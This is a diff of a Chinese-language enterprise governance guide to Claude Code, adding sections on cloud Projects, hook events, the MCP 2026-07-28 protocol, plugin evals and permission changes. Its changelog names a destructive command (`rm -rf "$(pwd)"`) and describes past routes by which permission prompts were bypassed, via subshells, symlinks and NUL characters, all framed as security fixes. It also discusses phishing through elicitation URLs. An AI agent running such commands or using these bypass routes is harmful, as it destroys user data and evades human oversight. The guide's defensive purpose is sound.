+> - **Team 與 Enterprise 方案尚不可用**；**beta 期間沒有任何組織層級的控制**。
+> - 只能在 claude.ai/code、Desktop App 與行動 App 使用；**CLI、Bedrock、Vertex、Foundry 都不支援**。CLI 的 `claude project` 指令（管理本機專案狀態）與此功能**無關**。
+>
+> 🎯 **對企業的意義**：組織目前**無法**透過 managed settings 管控 Projects。若開發者在公司的 GitHub repo 上使用**個人** Pro／Max 帳號的 Projects，那些工作會落在企業治理範圍之外。請把「禁止以個人帳號連結公司 repo」寫進使用規範，並由 GitHub 端的 App 安裝權限把關。
+
+#### 18.8.2 context 的來源【Official】
+
+| 來源 | 內容 | 設定位置 |
+| --- | --- | --- |
+| **Project instructions** | 每個新 thread 都會收到的文字（**上限 16,000 字元**） | Project settings > Memory |
+| **Project memory** | Claude 自行寫入的需求、決策、陷阱（以 `MEMORY.md` 為索引）；**與本機 auto memory 分開** | 由 Claude 自動寫入 |
+| **Repositories、檔案、環境** | 每個 thread 都會 clone 的 repo、`/mnt/project-files` 下的檔案、執行用的雲端環境 | Project settings > Environment |
+
+多 repo 專案的載入規則（治理重點）：
+
+| 項目 | 單一 repo 專案 | 多 repo 專案 |
+| --- | --- | --- |
+| 各 repo 的 `CLAUDE.md` 與 skills | 載入 | **全部載入**（每個 clone 以 additional directory 掛入） |
+| `.claude/settings.json` 的權限規則、hooks、`env` | 套用 | 🚨 **不套用**（thread 在 clone 的上層目錄啟動，不讀任何 repo 的設定檔） |
+| repo 宣告的 plugins | **不載入**（雲端 session 限制） | 不載入 |
+
+> ⚠️ **權限模型**：thread 在模型支援時以 **auto mode** 執行。多 repo 專案中，**repo 的 deny 規則與 hooks 都不會生效**，因此不能依賴 repo 設定來保護敏感操作。
+
+#### 18.8.3 成本與額度【Official】
+
+- 與其他 Claude Code session **共用方案額度**，但消耗更快（Pro 方案尤其明顯）。
+- 用量來源：執行中的 thread（每個都是完整 session）、協調對話本身、**監看 PR 的 thread**（CI 失敗或出現 review 留言時會被喚醒）。
+- 硬性上限：**每天新開 200 個 thread**（跨所有專案）。你要求的「一次只跑幾個 thread」只是偏好，不是硬性上限。
+- 碰到額度上限的 thread 會**等額度重置後自動繼續**，也就是會用掉你下一個額度週期；只有在帳號開啟 usage credits 時才會超額計費。
+
+#### 18.8.4 限制與風險【Official】
+
+| 限制 | 影響 |
+| --- | --- |
+| 只支援 github.com | GitHub Enterprise Server、GitLab、Bitbucket 都不可用 |
+| thread 的 sandbox 在回合之間暫停，無法恢復時會從全新的 clone 繼續 | **未 commit 的變更可能遺失**；長任務要讓 Claude 定期 commit 並 push |
+| 專案只屬於單一使用者 | 無法分享；thread transcript 也沒有分享選項 |
+| 刪除專案 | 永久刪除 thread、記憶與檔案，並關閉排程；**已 push 的分支與 PR 不受影響** |
+
+### 18.9 本章實務案例
 
 **案例：一次 500 檔案的遷移**
 
@@ -6229,7 +7263,7 @@ Work on each file in its own isolated copy.
 
 成本控制：先用 `use a workflow to migrate every .vue file under src/components/atoms/`（只有 30 個檔案）試跑，確認品質與成本後才全量執行。
 
-### 18.9 本章注意事項
+### 18.10 本章注意事項
 
 > 🚨 **Agent Teams 是實驗性功能，且啟用後會改變一般委派行為。** 企業導入前請先在小範圍試點，並明確告知團隊「Claude 可能在你沒要求時組隊」。
 >
@@ -6264,62 +7298,76 @@ Hook 是**在 Claude Code 到達某個生命週期事件時執行的東西**：�
 
 ### 19.2 Hook 事件完整清單【Official】
 
+> ⚠️ **v1.2 更正**：本節依官方 `hooks` 頁逐列重新覆核，更正了 v1.1 的 `PreCompact`（exit 2 **會阻擋壓縮**，v1.1 誤植為「全部忽略」）、`PostToolBatch`（exit 2 **會中止 agentic loop**）、`ConfigChange`（**無法阻擋 `policy_settings`**）等欄位，並補上 `Notification`、`MessageDisplay`、`DirectoryAdded`、`Elicitation`、`ElicitationResult` 五個事件。「exit 2」欄描述的是 hook 以結束代碼 2 結束時的行為。
+
 #### 19.2.1 Session 層級
 
 | 事件 | 觸發時機 | Matcher | exit 2 |
 | --- | --- | --- | --- |
-| `SessionStart` | Session 開始或續接 | `startup`、`resume`、`clear`、`compact`、`fork` | 非阻斷錯誤 |
-| `Setup` | `--init-only` 或維護模式啟動時 | `init`、`maintenance` | 非阻斷錯誤 |
-| `SessionEnd` | Session 結束 | `clear`、`resume`、`logout`、`prompt_input_exit`、`other` | 輸出被忽略 |
+| `SessionStart` | Session 開始或續接 | `startup`、`resume`、`clear`、`compact`、`fork` | 不阻擋；stderr 只顯示給使用者 |
+| `Setup` | `--init-only` 或維護模式啟動時 | `init`、`maintenance` | 忽略 |
+| `SessionEnd` | Session 結束 | `clear`、`resume`、`logout`、`prompt_input_exit`、`other` | 不阻擋；stderr 只顯示給使用者 |
+| `Notification` | Claude Code 發出通知時（**即使關閉桌面通知也會觸發**） | `permission_prompt`、`idle_prompt`、`auth_success`、`elicitation_dialog`、`agent_needs_input`、`agent_completed`、`quota_auto_resume_fired` 等 | 忽略 |
 
-#### 19.2.2 Prompt 層級
+#### 19.2.2 Prompt 與顯示層級
 
 | 事件 | 觸發時機 | Matcher | exit 2 |
 | --- | --- | --- | --- |
 | `UserPromptSubmit` | Claude 處理你的輸入之前 | 不支援 | **阻擋 prompt 並清除它** |
-| `UserPromptExpansion` | Slash command 展開成 prompt 時 | 指令 / skill 名稱 | **阻擋展開** |
+| `UserPromptExpansion` | Slash command 展開成 prompt 時 | 指令／skill 名稱 | **阻擋展開** |
 | `Stop` | Claude 回應完畢時 | 不支援 | **阻止 Claude 停止，繼續對話** |
-| `StopFailure` | 因 API 錯誤而結束回合 | `rate_limit`、`overloaded`、`authentication_failed`、`server_error` 等 | 全部忽略 |
+| `StopFailure` | 因 API 錯誤而結束回合 | `rate_limit`、`overloaded`、`authentication_failed`、`billing_error`、`model_not_found`、`server_error`、`max_output_tokens`、`cloud_credential_error` 等 | 忽略（`terminalSequence` 除外） |
+| `MessageDisplay` | 助理訊息串流顯示到畫面時（依批次多次觸發，hook 可回傳替換文字） | 不支援 | 顯示原文 |
 
 #### 19.2.3 工具使用
 
-| 事件 | 觸發時機 | Matcher | 決策欄位 |
+| 事件 | 觸發時機 | Matcher | 決策與 exit 2 |
 | --- | --- | --- | --- |
-| **`PreToolUse`** | 工具呼叫執行前 | 工具名（`Bash`、`Edit\|Write`、`mcp__.*`），支援 `if` 條件如 `Bash(rm *)` | **`permissionDecision`（`"allow"` / `"deny"`）**、`permissionDecisionReason`、`systemMessage`；**exit 2 阻擋** |
-| `PermissionRequest` | 工具需要權限決策時 | 工具名 | **`decision`（`"allow"` / `"deny"`）**；exit 2 無效 |
-| `PermissionDenied` | auto mode 拒絕工具呼叫時 | 工具名 | `retry`（true/false） |
-| `PostToolUse` | 工具呼叫成功後 | 工具名 | `systemMessage`、`terminalSequence`、**`additionalContext`** |
-| `PostToolUseFailure` | 工具呼叫失敗後 | 工具名 | `systemMessage`、`additionalContext` |
-| `PostToolBatch` | 平行工具批次完成後 | 不支援 | `systemMessage` |
+| **`PreToolUse`** | 工具呼叫執行前 | 工具名（`Bash`、`Edit\|Write`、`mcp__.*`），支援 `if` 條件如 `Bash(rm *)` | **`permissionDecision`（`"allow"`／`"deny"`）**、`permissionDecisionReason`、`systemMessage`；**exit 2 阻擋工具呼叫** |
+| `PermissionRequest` | 工具需要權限決策時 | 工具名 | 以 **`decision` 物件**允許或拒絕；🚨 **exit 2 無效**，權限流程照常進行 |
+| `PermissionDenied` | auto mode 拒絕工具呼叫時 | 工具名 | 拒絕已發生，exit 2 無效；以 `hookSpecificOutput.retry: true` 告知模型可重試 |
+| `PostToolUse` | 工具呼叫成功後 | 工具名 | `systemMessage`、`terminalSequence`、**`additionalContext`**；exit 2 把 stderr 顯示給 Claude（工具已執行） |
+| `PostToolUseFailure` | 工具呼叫失敗後 | 工具名 | `systemMessage`、`additionalContext`；exit 2 把 stderr 顯示給 Claude |
+| `PostToolBatch` | 平行工具批次完成後 | 不支援 | 🚨 **exit 2 會在下一次模型呼叫前中止 agentic loop** |
 
-#### 19.2.4 Agent / Task
+#### 19.2.4 Agent／Task
 
 | 事件 | 觸發時機 | Matcher | exit 2 |
 | --- | --- | --- | --- |
-| `SubagentStart` | Subagent spawn 時 | agent 類型（`general-purpose`、`Explore`、自訂名） | 非阻斷錯誤 |
+| `SubagentStart` | Subagent spawn 時 | agent 類型（`general-purpose`、`Explore`、`Plan`、自訂名、`^my-plugin:reviewer$`） | 不阻擋；stderr 只顯示給使用者 |
 | `SubagentStop` | Subagent 完成時 | agent 類型 | **阻止 subagent 停止** |
 | `TaskCreated` | 透過 TaskCreate 建立任務時 | 不支援 | **回滾任務建立** |
 | `TaskCompleted` | 任務被標記完成時 | 不支援 | **阻止任務完成** |
-| `TeammateIdle` | Teammate 即將閒置時 | — | **送回饋並讓它繼續** |
+| `TeammateIdle` | Teammate 即將閒置時 | 不支援 | **阻止閒置，讓它繼續工作** |
 
-#### 19.2.5 檔案 / 設定
-
-| 事件 | 觸發時機 | Matcher | exit 2 |
-| --- | --- | --- | --- |
-| `FileChanged` | 被監看的檔案在磁碟上變動 | 字面檔名（`.envrc\|.env`） | 非阻斷錯誤 |
-| **`ConfigChange`** | Session 中設定檔變動 | `user_settings`、`project_settings`、`local_settings`、`policy_settings` | **阻擋設定變更** |
-| `CwdChanged` | 工作目錄改變 | 不支援 | 全部忽略 |
-| `InstructionsLoaded` | CLAUDE.md 或 rules 載入時 | `session_start`、`nested_traversal`、`path_glob_match`、`include`、`compact` | 全部忽略 |
-| `WorktreeCreate` / `WorktreeRemove` | 建立 / 移除 worktree 時 | — | 取代預設的 git 邏輯 |
-
-#### 19.2.6 模型 / Context
+#### 19.2.5 檔案／設定／目錄
 
 | 事件 | 觸發時機 | Matcher | exit 2 |
 | --- | --- | --- | --- |
-| `PreModelSwitch` | 套用模型切換前 | 標準模型名（`claude-opus-5`、`.*opus.*`） | **阻擋模型切換** |
-| `PostModelSwitch` | Session 模型變更後 | 標準模型名 | 非阻斷錯誤 |
-| `PreCompact` | Context 壓縮前 | `manual`、`auto` | 全部忽略 |
-| `PostCompact` | 壓縮完成後 | `manual`、`auto` | 全部忽略 |
+| `FileChanged` | 被監看的檔案在磁碟上變動 | 字面檔名（`.envrc\|.env`） | 不阻擋；stderr 只顯示給使用者 |
+| **`ConfigChange`** | Session 中設定檔變動 | `user_settings`、`project_settings`、`local_settings`、`policy_settings`、`skills` | **阻擋設定變更生效**；🚨 **`policy_settings` 除外**（managed 政策的變更無法被 hook 擋下） |
+| `CwdChanged` | 工作目錄改變 | 不支援 | 不阻擋；stderr 只顯示給使用者 |
+| `DirectoryAdded` | session 中以 `/add-dir` 或 SDK 的 `register_repo_root` 新增工作目錄後（啟動時的 `--add-dir` 由 `SessionStart` 涵蓋） | `slash_command`、`register_repo_root` | 不阻擋（目錄已加入）；stderr 寫入 debug log |
+| `InstructionsLoaded` | CLAUDE.md 或 rules 載入時（⚠️ 直接讀取的 `AGENTS.md` **不會觸發**，見第 [14.8.4 節](#1484-agentsmd-與-claudemd-的行為差異official)） | `session_start`、`nested_traversal`、`path_glob_match`、`include`、`compact` | 忽略 |
+| `WorktreeCreate`／`WorktreeRemove` | 建立／移除 worktree 時（取代預設的 git 邏輯） | 不支援 | 任何非 0 結束代碼都會讓建立／移除失敗 |
+
+#### 19.2.6 模型／Context
+
+| 事件 | 觸發時機 | Matcher | exit 2 |
+| --- | --- | --- | --- |
+| `PreModelSwitch` | 套用模型切換前 | 標準模型名（`claude-opus-5`、`.*opus.*`） | **阻擋模型切換**並把 stderr 顯示給使用者 |
+| `PostModelSwitch` | Session 模型變更後 | 標準模型名 | 不阻擋（已切換） |
+| `PreCompact` | Context 壓縮前 | `manual`、`auto` | 🚨 **阻擋壓縮** |
+| `PostCompact` | 壓縮完成後 | `manual`、`auto` | 不阻擋；stderr 只顯示給使用者 |
+
+#### 19.2.7 MCP 互動
+
+| 事件 | 觸發時機 | Matcher | exit 2 |
+| --- | --- | --- | --- |
+| `Elicitation` | MCP server 在任務中途要求使用者輸入時（預設顯示對話框，hook 可程式化回應並略過對話框） | MCP server 名稱 | **拒絕該 elicitation** |
+| `ElicitationResult` | 使用者回應 elicitation 之後、送回 server 之前（hook 可觀察、修改或阻擋回應） | MCP server 名稱 | **阻擋回應**（動作變為 decline） |
+
+> 🚨 **企業意義**：MCP 2026-07-28 協定新增 **URL-mode elicitation**，server 可以要求 Claude Code 開啟瀏覽器流程（第 [20.11 節](#2011-mcp-2026-07-28-協定與-v12-新增控制officialv12-新增)）。資安團隊可以用 `Elicitation` hook **記錄或拒絕來自非核准 server 的 elicitation**，避免使用者被引導到釣魚頁面。
 
 ### 19.3 Hook 的五種型別【Official】
 
@@ -6329,9 +7377,15 @@ Hook 是**在 Claude Code 到達某個生命週期事件時執行的東西**：�
 | --- | --- |
 | `command` | 執行 shell 指令（最常用） |
 | `http` | 發出 HTTP 請求（受 `allowedHttpHookUrls` 限制） |
-| `mcp_tool` | 呼叫 MCP 工具 |
+| `mcp_tool` | 呼叫 MCP 工具（v2.1.281 起，阻擋型事件會等候 MCP server 連線完成，最長到 MCP 連線逾時） |
 | `prompt` | 送一個 LLM prompt |
-| `agent` | 啟動一個 subagent |
+| `agent` | 啟動一個可使用 Read／Grep／Glob 的 subagent 來驗證條件【Preview：官方標示為 experimental】 |
+
+> ⚠️ **Version Note（v1.2 新增）：`PermissionRequest` 不再執行 agent 型 hook**
+>
+> v2.1.280 起，掛在 `PermissionRequest` 上的 `type: "agent"` hook **不會執行**，並會顯示錯誤、指示改用 `command` 或 `http` hook。原因是 agent hook 的回答在這個事件中本來就無法允許或拒絕請求。若貴司曾以 agent hook 做「AI 審核權限請求」，**升級後該控制會靜默失效**，請改寫為 `command` hook（可在其中自行呼叫模型），並以 `decision` 物件回傳結果。
+>
+> 其他相關修正：v2.1.275 修正 `SubagentStop` 帶特定 matcher 時，會對 agent 類型為空的 subagent 也觸發的問題；v2.1.274 修正 Stop prompt hook 在每次阻擋時重送完整 prompt 的問題（重複阻擋改以 500 字元的標籤表示）。
 
 ### 19.4 輸出格式【Official】
 
@@ -6911,7 +7965,64 @@ ENABLE_CLAUDEAI_MCP_SERVERS=false          # 關閉 claude.ai connectors
 | **供應鏈** | 第三方 server 的更新可能引入惡意程式碼 | 自建、或釘住版本、或內部託管 |
 | **`.mcp.json` 隨 repo 進來** | clone 的 repo 帶自己的 MCP 設定 | 首次使用需核准；企業設 `allowManagedMcpServersOnly` |
 
-### 20.11 本章實務案例
+### 20.11 MCP 2026-07-28 協定與 v1.2 新增控制【Official】（v1.2 新增）
+
+#### 20.11.1 兩套 MCP client runtime【Official】
+
+Claude Code 以兩種 client runtime 之一連接 MCP server：
+
+| Runtime | 基礎 | 協定 |
+| --- | --- | --- |
+| **v1** | MCP TypeScript SDK 1.x | 舊版協定 |
+| **v2** | MCP TypeScript SDK 2.0 | 新增 **MCP 2026-07-28** 協定修訂版 |
+
+預設使用 v2 的情境：會抓取 feature flag 的 session（v2.1.232+）；以及 **v2.1.274 起**，Bedrock、Claude Platform on AWS、Vertex、Foundry、經 Claude Apps Gateway 登入、關閉遙測（例如 `DISABLE_TELEMETRY`）的 session。
+
+v2 的行為差異：
+
+| 差異 | 企業影響 |
+| --- | --- |
+| 詢問 HTTP server 是否支援新協定，支援就改用新協定 | stdio server 預設**不**詢問；要詢問請設 `MCP_PROTOCOL_NEGOTIATION=auto` |
+| 透過常駐的串流接收 `list_changed` 通知 | 工具清單可動態更新 |
+| 🚨 以新協定連線的 **channel server 不會被註冊為 channel** | 新協定無法傳遞 channel 訊息；若貴司依賴 Channels（第 [42 章](#42-自動化hooksroutinesscheduled-taskschannels-與-headless)），**不要**對 stdio server 開 `MCP_PROTOCOL_NEGOTIATION=auto` |
+| 🚨 **MCP OAuth 的授權回應若帶有非預期的 issuer，登入會失敗**（`Issuer mismatch in authorization response`，v2.1.221+） | 防範 **OAuth mix-up 攻擊**。遇到此錯誤請修 server 端；改回 `MCP_SDK_GENERATION=v1` 可以暫時連線，但**會移除這層防護** |
+
+控制變數：`MCP_SDK_GENERATION=v1|v2` 釘選 runtime；`MCP_PROTOCOL_NEGOTIATION=auto|legacy` 決定是否詢問新協定。
+
+#### 20.11.2 URL-mode elicitation【Official】
+
+MCP server 可以在任務中途以 **elicitation** 向使用者要求輸入，有兩種模式：
+
+| 模式 | 行為 |
+| --- | --- |
+| Form mode | 顯示 server 定義的表單欄位（例如帳號密碼） |
+| **URL mode**（v2.1.281 於新協定連線上支援） | Claude Code **開啟瀏覽器 URL** 做驗證或核准，完成後在 CLI 確認 |
+
+URL mode 會把 URL 當作命令列參數交給系統的 URL handler，並限制長度（無跳脫字元時約 8,000 字元，大量 percent-escape 時約 4,000 字元）；超過上限時只能拒絕。
+
+> 🚨 **資安提醒**：URL-mode elicitation 等於讓**第三方 MCP server 可以要求使用者的瀏覽器開啟任意 URL**。若 server 遭到入侵，這就是釣魚入口。建議：
+>
+> 1. 以 managed MCP（`allowManagedMcpServersOnly`）限制可用的 server（第 [20.9 節](#209-企業-mcp-治理official--建議)）。
+> 2. 以 `Elicitation` hook 記錄每一次 elicitation，並拒絕 URL 網域不在允許清單中的請求（第 [19.2.7 節](#1927-mcp-互動)）。
+> 3. 在教育訓練中告知開發者：**MCP 開啟的登入頁面也要檢查網域**。
+
+#### 20.11.3 context 與啟動控制【Official】
+
+| 變數／行為 | 說明 | 版本 |
+| --- | --- | --- |
+| `CLAUDE_CODE_MAX_MCP_DESCRIPTION_LENGTH` | 每個 MCP 工具描述與 server instructions 送給模型的長度上限（預設 **2,048** 字元），超過會截斷 | v2.1.280+ |
+| `CLAUDE_CODE_MCP_STARTUP_WAIT_MS` | 非互動 session 的第一回合，等候仍在連線中的 MCP server 的時間；`0` 表示不等 | v2.1.274+ |
+| `.mcp.json`、settings、plugin、agent 檔中的 `"type": "sdk"` | **略過並警告**：只有 SDK 宿主程式能註冊 in-process server | v2.1.274+ |
+| MCP 設定中的 `${VAR}` | v2.1.274 修正：連線錯誤訊息與 MCP 登入工具說明**不再顯示已解析的 secret** | v2.1.274+ |
+| `managed-mcp.json` 無法讀取或解析 | 🚨 **維持獨占控制**（使用者、專案、plugin 的 server 都不載入）並在啟動時警告，屬於 fail-closed 行為 | v2.1.271+ |
+| server 中途斷線且自動重連放棄時 | 顯示通知並指向 `/mcp` | v2.1.273+ |
+| 403 `insufficient_scope` | 不再誤報為登入過期，會明確列出缺少的權限 | v2.1.274+ |
+
+> ✅ **CI 建議**：`claude -p` 在 CI 中若掛了 MCP server，請明確設定 `CLAUDE_CODE_MCP_STARTUP_WAIT_MS`（例如 `15000`），避免第一回合因 server 尚未連上而少了工具，造成結果不穩定。
+
+> 🚨 **v2.1.273 的治理修正（務必確認版本）**：在此版本之前，若組織**同時**使用 server-managed settings 與 MDM／`managed-settings.json`，後者設定的 `allowManagedMcpServersOnly`、`deniedMcpServers`、`disableClaudeAiConnectors` **會被忽略**。採用混合政策交付的組織，請把 `requiredMinimumVersion` 至少設為 `2.1.273`。
+
+### 20.12 本章實務案例
 
 **案例：一個把 Jira 工單變成 PR 的流程**
 
@@ -6966,7 +8077,7 @@ ENABLE_CLAUDEAI_MCP_SERVERS=false          # 關閉 claude.ai connectors
 
 🎯 **設計重點：MCP 提供連線，Skill 提供「怎麼正確使用它」的知識，權限規則提供邊界。三者缺一不可。**
 
-### 20.12 本章注意事項
+### 20.13 本章注意事項
 
 > 🚨 **MCP server 是外部程式碼。** stdio server 直接在你的機器上以你的身分執行。企業導入前必須經過資安審核。
 >
@@ -7390,7 +8501,89 @@ claude plugin validate ./my-marketplace
 
 📌 Claude Code 在載入時**忽略** `relevance` 與 `relevance.signals` 下的未知欄位，因此舊版用戶端仍能正常載入你的 marketplace。
 
-### 21.12 本章實務案例
+### 21.12 Plugin Evals：以 eval 套件驗證 plugin【Official】（v1.2 新增）
+
+`claude plugin validate` 只檢查 plugin 的**檔案格式與 schema**；`claude plugin eval`（v2.1.269 起正式提供）則檢查 plugin 的**行為**：它會用一組測試案例實際驅動 Claude，並對結果評分。對企業而言，這是**內部 plugin 上架私有 marketplace 前的品質閘門**。
+
+#### 21.12.1 運作原理【Official】
+
+| 概念 | 說明 |
+| --- | --- |
+| **Case（案例）** | `evals/<case>/prompt.md`：frontmatter 設定執行上限與工具，內文是使用者會輸入的真實 prompt |
+| **Grader（評分器）** | `evals/<case>/graders/*.md`：每個檔案是一項通過／不通過的檢查 |
+| **Run（執行）** | 每個 case 在**全新、隔離**的 `claude -p` 子行程中執行，只載入受測 plugin；預設跑 **3 次** |
+| **分數** | 一次執行的分數 = 通過的 grader 比例（可加權）；case 分數 = 各次執行的平均 |
+| **No-plugin baseline** | 預設每個 case 也會在**不載入 plugin** 的情況下再跑一輪，產生 `WITH`、`W/OUT` 兩個分數與差值 `Δ`，也就是**這個 plugin 實際貢獻了多少** |
+
+> 🎯 **`Δ` 是企業最該看的數字**：若某個 case 不裝 plugin 也拿到 1.0，代表 plugin 對它沒有貢獻，那段 skill 很可能只是在白佔 context（可搭配第 [13.6.1 節](#1361-skill-doctor找出白佔-context-的-skillofficialv11-新增) 的 `/skill-doctor` 一起檢視）。
+
+Grader 類型：
+
+| 類型 | 通過條件 | 適用情境 |
+| --- | --- | --- |
+| `regex` | 目標文字符合（或 `match: not_contains` 時不符合）JavaScript regex | 回覆格式、禁止字詞 |
+| `tool_used` | 指定工具的呼叫次數介於 `min`／`max` 之間（`min: 0, max: 0` 表示「絕不可呼叫」） | 🚨 **安全斷言**：例如「絕不可呼叫 `Bash(git push*)`」 |
+| `tool_order` | 工具 A 的第一次呼叫早於工具 B | 「先跑測試再 commit」 |
+| `file_exists` | 本次執行建立了符合 glob 的檔案 | 產出物檢查 |
+| `llm` | 評審模型對 rubric 三票中至少兩票 PASS | 語意品質 |
+| `baseline` | 評審模型判定本次執行至少與參考 transcript 一樣好 | 回歸比較 |
+
+Grader 可檢查的對象：`last_message`（預設）、`trace`（完整 session）、`files`（新建檔案清單）、單一檔案內容、`mock_calls`（對 mock MCP 工具的呼叫）。
+
+#### 21.12.2 隔離模型：執行時載入什麼、不載入什麼【Official】
+
+| 項目 | 行為 |
+| --- | --- |
+| 使用者設定、hooks、CLAUDE.md、MCP server、其他 plugin、memory、skills | **全部不載入**；每次執行都使用拋棄式的家目錄、工作目錄與設定 |
+| shell 環境變數 | 只傳入 allowlist（`PATH`、語系、proxy、憑證、認證相關）與 `EVAL_*` 變數 |
+| **Managed settings** | 🚨 **仍然生效**。受管機器上的分數可能與未受管機器不同 |
+| eval 目錄 | 受測 agent **讀不到** case 定義與 grader |
+| Artifact 工具 | 關閉 |
+| 網路 | ⚠️ 只有 shell 指令受沙箱網路規則約束；`WebFetch(domain:…)` 授權、plugin 自己的 hooks 與真實 MCP server **可以連到任何主機** |
+
+> ⚠️ **資安提醒**：第一次對某個目錄執行 eval 時會詢問 `Trust this plugin directory?`；在 git repo 內回答 yes，會**信任整個 repo**。CI 中使用 `--trust-plugin` 前，請確認 plugin 的程式碼與 eval 套件都已經過審查——它等同於「我願意執行這段程式碼」。
+
+#### 21.12.3 企業 CI 閘門範本【Official / 建議】
+
+```bash
+claude plugin eval . \
+  --trust-plugin \
+  --json results.json \
+  --threshold 0.8 \
+  --model claude-sonnet-5 \
+  --judge-model claude-haiku-4-5 \
+  --no-publish \
+  --max-cost-usd 20
+```
+
+| 旗標 | 企業用途 |
+| --- | --- |
+| `--model`／`--judge-model` | **釘選模型**，避免把模型改版誤判為 plugin 回歸 |
+| `--threshold` | 通過門檻（預設 1.0，對非決定性 agent 太嚴格，建議 0.8） |
+| `--max-cost-usd` | 以**牌價估算**的花費上限（不是方案額度）；超過後不再啟動新的執行 |
+| `--no-publish` | 🚨 **HTML 報告只留在本機**，不要發布到外部 |
+| `--mocks record`（預設） | 以 mock 回應 MCP 工具呼叫，**不啟動 plugin 的真實 MCP server**，避免 CI 碰到正式系統 |
+| `-j`／`--concurrency` | 1–8；共用帳號的速率限制，只縮短牆鐘時間 |
+
+結束代碼：`0` 全部通過；`1` 有 case 低於門檻、載入失敗、目錄未受信任或參數錯誤；`2` 部分執行（碰到花費上限或憑證被拒）；`130` 被中斷；`143` 被終止（例如 CI 逾時）。
+
+> 💰 **成本提醒**：每一次 eval 執行與每一次 `llm` 評審都是真實的模型呼叫。粗估呼叫量約為「case 數 × 執行次數 × 2（含 baseline）」，再加上評審呼叫。建議**只在 plugin 變更的 PR 上觸發**，不要每個 commit 都跑。
+
+> 📌 **與 skill-creator 的差異**：`claude plugin eval` 的案例格式，與 skill-creator plugin 使用的 `evals/evals.json` **不同**，兩者不要混用。在共用的評測主機上，請搭配第 [15.7.1 節](#1571---restricted共用機器上的評估模式official) 的 `--restricted`。
+
+#### 21.12.4 v1.2 新增的 plugin 供應鏈防護【Official】
+
+| 版本 | 變更 | 企業意義 |
+| --- | --- | --- |
+| 2.1.271 | `claude plugin install/update --accept-command <sha256>` | 以 hash **只核准先前 `--json` 顯示過的那一條確切指令**；若指令、plugin 或 marketplace 目錄有任何變動就會拒絕。CI 中請以它取代 `-y` |
+| 2.1.275 | npm 來源的 plugin 改用 `npm pack --ignore-scripts` 取得，並驗證完整性 | 套件的 `preinstall`／`postinstall` **不再執行** |
+| 2.1.275 | `/plugin install <plugin> --marketplace <source>` | 安裝前會提示加入 marketplace，減少手動輸入錯誤的來源 |
+| 2.1.275 | 修正 marketplace URL 中的密碼或 token 出現在訊息與記錄中的問題 | 憑證外洩修正 |
+| 2.1.278 | 修正單一格式錯誤的 `strictKnownMarketplaces`／`blockedMarketplaces` 項目會**靜默停用整個企業 marketplace 政策**的問題 | 🚨 **治理失效修正** |
+| 2.1.280 | 名稱模仿保留 marketplace 名稱者，新增時拒絕；已加入者停止載入 | 防止「山寨官方 marketplace」 |
+| 2.1.281 | `claude plugin validate` 新增 MCP 檢查：會被靜默丟棄的 `.mcp.json` 項目、未宣告的 `${user_config.*}` 引用、不安全的 URL | 私有 marketplace 上架前的必跑檢查 |
+
+### 21.13 本章實務案例
 
 **案例：把 12 個 repo 的重複設定收斂成一個 Plugin**
 
@@ -7446,7 +8639,7 @@ claude-corp-plugin/
 | 專案層可自訂 skills/hooks | 可（風險） | **不可**（`strictPluginOnlyCustomization`） |
 | 新 repo 的設定時間 | 約 30 分鐘 | 約 2 分鐘 |
 
-### 21.13 本章注意事項
+### 21.14 本章注意事項
 
 > 🚨 **`strictPluginOnlyCustomization: true` 會讓開發者無法自訂專案層的 skills、agents、hooks 與 MCP。** 這是刻意的權衡：安全性換彈性。導入前務必與團隊溝通，並確保 plugin 的更新流程足夠敏捷（否則開發者會想辦法繞過）。
 >
@@ -7570,6 +8763,27 @@ claude -p "<prompt>" --dangerously-skip-permissions
 - `permissions.blockReadsOutsideWorkingDirectories` 開啟時，工作目錄外的讀取（需 v2.1.257+）
 
 以及：**寫入 protected paths 的動作，除了在 `bypassPermissions` 模式、以及 bypass 可用的 plan-mode session 之外，永不自動核准。**
+
+#### 22.4.1 v2.1.269–281 的權限行為變更【Official】（v1.2 新增）
+
+> 📌 以下項目來自官方 changelog。部分環境變數（例如 `CLAUDE_CODE_DISABLE_DANGEROUS_RM_TIMEOUT`、`CLAUDE_CODE_DISABLE_SUBSTITUTION_RM_PROMPT`）**尚未列入官方 `env-vars` 頁**，屬於【⚠️ 文件不一致】，寫進企業規範前請先實測。
+
+| 版本 | 變更 | 企業應對 |
+| --- | --- | --- |
+| 2.1.281 | 在 `--dangerously-skip-permissions` 與 auto mode 下，危險 `rm` 的提示**等候 2 分鐘**；沒有人回應時**自動拒絕**，並附上改寫建議，讓無人值守的 session 繼續進行（`CLAUDE_CODE_DISABLE_DANGEROUS_RM_TIMEOUT=1` 可關閉逾時） | 無人值守流程不會再卡在提示上；但被拒絕的刪除需要在事後檢視 log |
+| 2.1.281 | 🚨 修正：目標只來自指令替換的遞迴 `rm`（如 `rm -rf "$(pwd)"`）在 auto／bypass 模式下**不經詢問就執行**；現在即使有 Bash allow 規則也會詢問 | **破壞性操作修正**，無人值守環境務必升級 |
+| 2.1.281 | 🚨 修正：含 NUL 字元的權限規則被展開成萬用比對；現在這類規則不比對任何東西 | 權限規則被惡意 settings 檔利用的風險 |
+| 2.1.280 | 🚨 修正：**經 symlink 的寫入**以樹內路徑判斷，`acceptEdits`、allow 規則與 auto mode 會放行實際落在樹外的寫入；現在提示會顯示寫入的真實位置 | **權限繞過修正** |
+| 2.1.277 | 危險 `rm` 偵測擴大：以 shell 變數、由工作目錄推導的變數、或只有反斜線的路徑作為目標時也會標記 | — |
+| 2.1.274 | 對特殊 shell 變數做迴圈或指派的指令改為需要許可 | — |
+| 2.1.273／2.1.271 | 修正多種 Bash 指令（無法完整分析者、多次 `cd`、subshell、`cd`+`git` 串接、subshell 中隱藏的危險 `rm`）在 `blockReadsOutsideWorkingDirectories` 或 bypass 模式下**略過提示** | 啟用 `blockReadsOutsideWorkingDirectories` 的組織至少需要 v2.1.273 |
+| 2.1.271 | Bash 權限檢查修正：`fmt`、`column` 讀取的檔案；萬用字元展開後的檔案；以 shell 宣告旗標偽裝指令 | — |
+| 2.1.271 | auto mode 下，skill 或 slash command 中的 inline `!` shell 指令改依 default mode 的權限規則處理，而不是交給分類器 | skill 作者需要知道：inline 指令可能會跳出詢問 |
+| 2.1.271 | auto mode 下，subagent 回報給呼叫者時，改用一個**經分類器審查**的專用交回呼叫 | 防止 subagent 的結果繞過審查 |
+| 2.1.269 | 修正以 `!` 開頭的 deny／ask 規則會越出其來源設定檔的問題 | — |
